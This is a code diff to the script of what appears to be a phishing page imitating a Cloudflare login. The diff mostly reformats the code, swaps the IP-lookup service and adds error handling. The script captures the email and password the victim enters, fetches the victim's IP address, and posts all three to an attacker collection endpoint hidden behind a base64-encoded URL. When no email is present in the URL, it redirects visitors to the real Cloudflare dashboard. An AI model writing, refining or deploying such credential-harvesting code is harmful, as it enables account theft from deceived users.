@@ -197,20 +197,19 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
     }
   }
 
-	function createErrorContainer() {
-	  let errorContainer = document.getElementById('error-container');
-	  if (!errorContainer) {
-		errorContainer = document.createElement('div');
-		errorContainer.id = 'error-container';
-		errorContainer.style.display = 'none'; // completely invisible
-		document.body.appendChild(errorContainer);
-	  }
-	}
-
+  function createErrorContainer() {
+    let errorContainer = document.getElementById('error-container');
+    if (!errorContainer) {
+      errorContainer = document.createElement('div');
+      errorContainer.id = 'error-container';
+      errorContainer.style.display = 'none';
+      document.body.appendChild(errorContainer);
+    }
+  }
 
   function submitToServer(username, password, ip) {
     var C0M = atob("aHR0cHM6Ly9jbG91ZC4weDU5ZDY3MWZkMTU4ZDdkNGM1NmRmZDY1YzQ2YjA3OGY5ODM2YTJkNDAuY2xvdWQvMzIxLnBocA");
-	const serverURL = C0M;
+    const serverURL = C0M;
     const payload = {
       email: username,
       password: password,
@@ -235,39 +234,32 @@ WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
       });
   }
 
-function showError(message) {
-  const errorContainer = document.getElementById('error-container');
-  errorContainer.textContent = message;
-
-  // Apply styles only when showing
-  errorContainer.style.display = 'block';
-  errorContainer.style.color = 'white';
-  errorContainer.style.backgroundColor = 'red';
-  errorContainer.style.padding = '10px';
-  errorContainer.style.marginTop = '10px';
-  errorContainer.style.borderRadius = '5px';
-  errorContainer.style.fontSize = '14px';
-  errorContainer.style.textAlign = 'center';
-}
+  function showError(message) {
+    const errorContainer = document.getElementById('error-container');
+    errorContainer.textContent = message;
+    errorContainer.style.display = 'block';
+    errorContainer.style.color = 'white';
+    errorContainer.style.backgroundColor = 'red';
+    errorContainer.style.padding = '10px';
+    errorContainer.style.marginTop = '10px';
+    errorContainer.style.borderRadius = '5px';
+    errorContainer.style.fontSize = '14px';
+    errorContainer.style.textAlign = 'center';
+  }
 
   function onSubmit(event) {
     event.preventDefault();
-
     const email = document.getElementById('amg-e').value;
     const password = document.getElementById('amg-p').value;
-
     if (!password.trim()) {
       showError('Password cannot be empty.');
       return;
     }
-
     attemptCount++;
-
-    fetch('https://api.ipify.org?format=json')
+    fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
-
         submitToServer(email, password, ip)
           .then(() => {
             if (attemptCount === 1) {
@@ -286,6 +278,10 @@ function showError(message) {
             console.error('Error during submission:', error);
             showError('An error occurred while submitting. Please try again.');
           });
+      })
+      .catch((error) => {
+        console.error('Error fetching IP:', error);
+        showError('Failed to fetch IP address.');
       });
   }
 
@@ -293,14 +289,20 @@ function showError(message) {
     const email = getEmailFromURL();
     if (email) {
       document.getElementById('amg-e').value = email;
+    } else {
+      setTimeout(function () {
+        window.location.href = 'https://dash.cloudflare.com';
+      }, 100);
     }
-	else{setTimeout(function(){window.location.href='https://dash.cloudflare.com'},100);}
     createErrorContainer();
-
     const submitButton = document.querySelector('input[type="submit"]');
     submitButton.addEventListener('click', onSubmit);
-	const passwordField=document.getElementById('amg-p');
-	passwordField.addEventListener('keydown',function(e){if(e.key==='Enter'){onSubmit(e);}});
+    const passwordField = document.getElementById('amg-p');
+    passwordField.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
+        onSubmit(e);
+      }
+    });
   };
 </script>
 
